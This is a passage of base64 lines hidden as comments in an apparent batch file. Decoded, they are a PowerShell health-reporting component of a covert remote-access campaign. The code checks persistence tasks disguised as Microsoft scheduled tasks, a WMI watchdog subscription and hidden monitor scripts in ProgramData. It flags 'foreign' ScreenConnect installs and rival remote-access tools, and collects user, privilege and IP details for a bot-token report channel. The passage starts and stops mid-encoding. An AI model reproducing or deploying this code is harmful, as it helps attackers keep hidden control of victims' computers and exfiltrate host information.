::RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0NCiAgICBpZiAoLW5vdCAkc
::3RhdHVzKSB7ICRzdGF0dXMgPSAncHJlc2VudCcgfQ0KICAgICRuZXh0ID0gJG1hcFsnTmV4dCBS
::dW4gVGltZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9DQogICAgJGxhc3Q
::gPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbGFzdCkgeyAkbGFzdCA9IC
::cnIH0NCiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQ0KICAgIGlmICgtbm90ICRyZ
::XN1bHQpIHsgJHJlc3VsdCA9ICcnIH0NCiAgICAkaGVhbHRoeSA9ICgkc3RhdHVzIC1tYXRjaCAn
::UmVhZHl8UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKQ0KICAgIHJldHVybiB
::Aew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgSGVhbHRoeSA9IFtib29sXSRoZW
::FsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkc3RhdHVzDQogICAgICAgIE5leHQgICAgPSAkbmV4d
::A0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQNCiAg
::ICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAkdG9rZW5zID0gQCgNCiAgICA
::gICAgJ0FueURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAnRFdBZ2VudCcsICdEV1
::NlcnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAgICdXaW5WTkMnLCAnd
::m5jc2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obycsICdSdXN0RGVzaycsICdSZW1v
::dGVQQycsICdEYW1lV2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmp
::hUk1NJywgJ05pbmphT25lJywgJ05pbmphJywgJ0thc2V5YScsICdQdWxzZXdheScsICdTeW5jcm
::8nLA0KICAgICAgICAnU3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1NvbGFyV2luZHMnLCAnQ
::29ubmVjdFdpc2UnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0KICAgICAgICAnQWN0aW9uMScs
::ICdTaW1wbGVIZWxwJywgJ0JvbWdhcicsICdCZXlvbmRUcnVzdCcsICdNZXNoQWdlbnQnLCAnTWV
::zaCBDZW50cmFsJywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywgJ3RhY3RpY2Fscm1tJywgICAgIC
::AgICAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywNC
::iAgICAgICAgJ0Nocm9tZSBSZW1vdGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0U3VwcG9ydCcs
::ICdMZXZlbC5pbycsICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdEYXR0byBSTU0nLCAnQ29udGl
::udXVtJw0KICAgICkNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLk
::dlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAgIGZ1bmN0aW9uIEFkZ
::C1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkgew0KICAgICAgICAka2V5ID0gIiRr
::aW5kfCRuYW1lIi5Ub0xvd2VySW52YXJpYW50KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRhaW5
::zS2V5KCRrZXkpKSB7IHJldHVybiB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAgIC
::AgICAgW3ZvaWRdJGhpdHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2luZ
::CwgKEVzYyAkbmFtZSkpKQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkbiA9ICRfLk5hbWU
::NCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICBpZiAoJG4gLWxpa2UgJ1Njcm
::VlbkNvbm5lY3QgQ2xpZW50KicpIHsgcmV0dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJ
::HRva2Vucykgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQgLWxpa2Ug
::IiokdCoiKSB7DQogICAgICAgICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR
::1cykpIikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQ
::ogICAgfQ0KDQogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgf
::CBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRuID0gJF8uUHJvY2Vzc05hbWUNCiAgICAgICAg
::aWYgKCRuIC1saWtlICcqU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAgIGZvcmV
::hY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIH
::sNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJyZ
::WFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5pbnN0ID0gQCgN
::CiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9
::uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3
::Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb
::3JlYWNoICgkcGF0aCBpbiAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBh
::dGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICA
::gICAgICAgICAkZG4gPSBbc3RyaW5nXSRfLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoLW
::5vdCAkZG4pIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGlmICgkZG4gLWxpa2UgJypTY3JlZW5Db
::25uZWN0KicpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
::IHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICIqJHQqIikgew0KICAgICAgICAgICA
::gICAgICAgICBBZGQtSGl0ICdtc2knICRkbg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KIC
::AgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgI
::HJldHVybiAkaGl0cw0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAgJGxpc3Qg
::PSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICA
::gIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZW
::N0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgRm9yRWFjaC1PY
::mplY3Qgew0KICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2
::fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0NCiAgICAgICAgJHRhZyA9IGlmICg
::kZnAgLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAnS0VFUC1QUklNQVJZJyB9DQogICAgICAgIG
::Vsc2VpZiAoJGZwIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgI
::CAgIGVsc2UgeyAnRk9SRUlHTicgfQ0KICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIDxjb2Rl
::PnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2MgJF8uTmFtZSksIChFc2MgKFt
::zdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQ0KICAgIH0NCg0KICAgICRyb290cyA9IEAoDQogIC
::AgICAgICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsDQogICAgI
::CAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIg0KICAg
::ICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRyb290cykgew0KICAgICAgICBHZXQtQ2hpbGRJdGV
::tIC1QYXRoICRwYXQgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IE
::ZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0aDogP
::GNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQ0KICAgICAgICB9DQogICAg
::fQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnR
::cV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicsDQogICAgICAgICdIS0xNOlxTT0
::ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc
::3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkgew0KICAgICAg
::ICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHw
::gV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRpc3BsYXlOYW1lIC1saWtlICcqU2NyZW
::VuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkd
::mVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7
::ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIG1zaTogPGNvZGU+ezB9PC9
::jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwgKEVzYyAkdmVyKSkpDQogICAgIC
::AgIH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGxpc3QuQ
::WRkKCctIChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0NCg0KJGNmZyA9IEdldC1DZmcN
::CmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkgew0KICAgIEF
::kZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicpIC
::1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogI
::CAgZXhpdCAyDQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4
::NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0Mjc
::pJw0KJG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0
::lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwY
::WwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06
::OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3d
::zQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdobyAtbGlrZSAnKl
::NZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0KJG1zaUNhY2hlI
::D0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAoVGVzdC1QYXRo
::ICRtc2lDYWNoZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlKS5
::MZW5ndGggLyAxS0IpDQp9IGVsc2UgeyAnbm9uZScgfQ0KDQokbW9uUGF0aCA9IEpvaW4tUGF0aC
::AkV29ya0RpciAnb3duX21vbi5jbWQnDQokZXRsTW9uID0gIiRlbnY6UHJvZ3JhbURhdGFcTWljc
::m9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGVcZXRsX21vbi5jbWQiDQokaGFzTW9uID0g
::VGVzdC1QYXRoICRtb25QYXRoDQokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24NCg0KIyBwZXI
::taG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZyb20gaWRlbnRpdHkuY2
::ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZ
::mcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRl
::bnQgLUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCR
::fIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2
::hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3MgPSBAKA0KI
::CAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1hcC5UQVNLX0EgfSBlbHNl
::IHsgJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1bGVkJyB9KTsgUm9sZSA9ICJ
::0aWNrICQoJGlkTWFwLk1PX0EpbSAoY2hhaW4xKSIgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJG
::lkTWFwLlRBU0tfQikgeyAkaWRNYXAuVEFTS19CIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd
::3NcUExBXFNlcnZlcicgfSk7IFJvbGUgPSAiYmFja3VwICQoJGlkTWFwLk1PX0IpbSAoY2hhaW4x
::KSIgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfQykgeyAkaWRNYXAuVEFTS19
::DIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0JyB9KTsgUm
::9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuV
::EFTS19EKSB7ICRpZE1hcC5UQVNLX0QgfSBlbHNlIHsgJ1xNaWNyb3NvZnRcV2luZG93c1xUY3Bp
::cFxJcEFkZHJlc3NDb25mbGljdDEnIH0pOyBSb2xlID0gJ09OTE9HT04gKGNoYWluMSknIH0NCik
::NCiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbg0KJHdtaUMgPSBHZXQtV21pT2
::JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlb
::nRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiRleHBlY3RlZFRhc2tzICs9IEB7IE5hbWUgPSAnXFdNSVxXdWN
::hY2hlV2F0Y2hkb2dDJzsgUm9sZSA9ICd0aW1lciAzbSAoY2hhaW4yKSc7IFdtaSA9ICgkbnVsbC
::AtbmUgJHdtaUMpIH0NCg0KJHRhc2tMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb
::25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQokdGFza09rID0gMA0KJHRhc2tCYWQgPSAwDQpmb3Jl
::YWNoICgkdCBpbiAkZXhwZWN0ZWRUYXNrcykgew0KICAgIGlmICgkdC5Db250YWluc0tleSgnV21
::pJykpIHsNCiAgICAgICAgaWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IG
::Vsc2UgeyAkdGFza0JhZCsrOyAkbWFyayA9ICdNSVNTSU5HJyB9DQogICAgICAgIFt2b2lkXSR0Y
::XNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+IC0gezJ9JyAtZiAkbWFyaywg
::KEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSkpDQogICAgICAgIGNvbnRpbnVlDQogICAgfQ0
::KICAgICRoID0gR2V0LVRhc2tIZWFsdGggJHQuTmFtZQ0KICAgIGlmICgkaC5QcmVzZW50IC1hbm
::QgJGguSGVhbHRoeSkgew0KICAgICAgICAkdGFza09rKysNCiAgICAgICAgJG1hcmsgPSAnT0snD
::QogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAgICAgICAgJHRhc2tCYWQrKw0KICAgICAg
::ICAkbWFyayA9ICdXRUFLJw0KICAgIH0gZWxzZSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICA
::gICAgJG1hcmsgPSAnTUlTU0lORycNCiAgICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJG
::guUHJlc2VudCkgew0KICAgICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVzK
::SB7ICRiaXRzICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQgLW5lICcnIC1h
::bmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0UmVzdWx0PSIgKyAkaC5SZXN
::1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdH
::MgLWpvaW4gJywgJykgKyAnKScgfQ0KICAgIH0NCiAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJ
::y0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFt
::ZSksIChFc2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdldC1
::TdmNMaW5lICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRwcmltT2sgPSAkcH
::JpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0gJHByaW1PayAtYW5kICgkdGFza
::09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVtb2ppTWFwID0gQHsNCiAgICBPSyAgICAgICA9
::IFtzdHJpbmddKFtjaGFyXTB4MjcwNSkNCiAgICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo
::6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaG
::FyXTo6Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJpbmddK
::FtjaGFyXTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFyXTB4MjZBMSkNCiAg
::ICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNjgwKSk
::NCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNE
::UxKSkNCn0NCiRrZXkgPSAkU3RhdGUuVG9VcHBlckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJ
::GVtb2ppTWFwLkNvbnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAo
::W3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRpdGxlID0
::gc3dpdGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0aHknIH0NCiAgICAnRE
::9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0KICAgICdSRVNUT1JFRCcgeyAnUHJpb
::WFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlMJyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JD
::RScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPayk
::geyAnRklSU1QgREVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFRE
::VEJyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0IHsgIlN0Y
::XRlOiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRl
::IC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRzY0xpc3QgPSBHZXQtU2NJbnN0YWxscw0
::KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0KaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2
::lkXSRybW1IaXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVib
::GljSXANCiRsYW4gPSBHZXQtTG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5
::LU1NLWRkIEhIOm1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAgICAkYm9vdCA
::9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5MYXN0Qm9vdFVwVGltZQ
::0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1oIHswOm1tfW0nIC1mICgoR2V0LURhdGUpI
::C0gJGJvb3QpDQp9IGNhdGNoIHt9DQoNCiMgY2FtcGFpZ24gc3RhdGUgZmlsZSAod3JpdHRlbiBi
::eSBvd25fbGliLnBzMSBzdGF0ZSBhY3Rpb24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9
::iaiA9ICRudWxsDQokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbi
::cNCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUgPSAoR2V0LUNvb
::nRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRyaW0oKQ0KICAgIHRyeSB7DQog
::ICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICA
::gJGZvcmVpZ25Dc3YgPSBpZiAoJHN0YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaW
::duIC1qb2luICcsJykgfSBlbHNlIHsgJy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltP
::SQoJHN0YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3JlaWdu
::Q3N2XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50YXNrc1RvdGFsKSB
::3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3RhdGVPYmouaW5zdGFsbENvdW50KS
::INCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9DQp9DQoNCiRkZXBsb3lCb
::G9jayA9ICcnDQppZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgk
::ZGVwbG95T2spIHsgJ0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCB
::JTkNPTVBMRVRFJyB9DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGggIiR7ZW
::52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJvZ3JhbUZpb
::GVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB8DQogICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1
::hdGNoICc1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0MjcnIH0pDQogICAgJGRpYWdMaW
::5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddD
::QogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAo
::VGVzdC1QYXRoICRib290UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0KICAgICA
::gICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28nLC
::AnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAgICAgICdtc2lfdW5hdmFpbGFibGUnL
::CAnc2VjdXJlXycsICdnb18nDQogICAgICAgICkNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRib290UGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICA
::gICAgICBXaGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICRsaW5lID0gJF8NCiAgICAgIC
::AgICAgICAgICBmb3JlYWNoICgkdCBpbiAkaW50ZXJlc3RpbmcpIHsgaWYgKCRsaW5lIC1saWtlI
::CIqJHQqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgICAgICAgICAgJGZhbHNlDQogICAg
::ICAgICAgICB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgLUxhc3QgMTggfA0KICAgICA
::gICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0gPGNvZGU+ez
::B9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkgf
::Q0KICAgIH0NCiAgICBpZiAoJGRpYWdMaW5lcy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kZGlhZ0xp
::bmVzLkFkZCgnLSAobm8gaW5zdGFsbC9udWtlIG1hcmtlcnMgaW4gYm9vdC5lcnIpJykgfQ0KICA
::gICRkZXBsb3lCbG9jayA9IEAiDQoNCjxiPkRlcGxveSB2ZXJkaWN0PC9iPg0KLSBSZXN1bHQ6ID
::xiPiQoRXNjICR2ZXJkaWN0KTwvYj4NCi0gUHJpbWFyeSBSdW5uaW5nOiAkKGlmICgkcHJpbU9rK
::SB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0gTW9uaXRvciBzY3JpcHQgKC53dWNhY2hlXG93
::bl9tb24uY21kKTogJChpZiAoJGhhc01vbikgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIEJ
::hY2t1cCBtb24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUy
::cgfSBlbHNlIHsgJ05PJyB9KQ0KLSBQZXJzaXN0IHRhc2tzIE9LOiAkdGFza09rIC8gJCgkZXhwZ
::WN0ZWRUYXNrcy5Db3VudCkgKGJhZC9taXNzaW5nOiAkdGFza0JhZCkNCi0gTVNJIGNhY2hlOiAk
::KEVzYyAkbXNpU2l6ZSkNCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ29
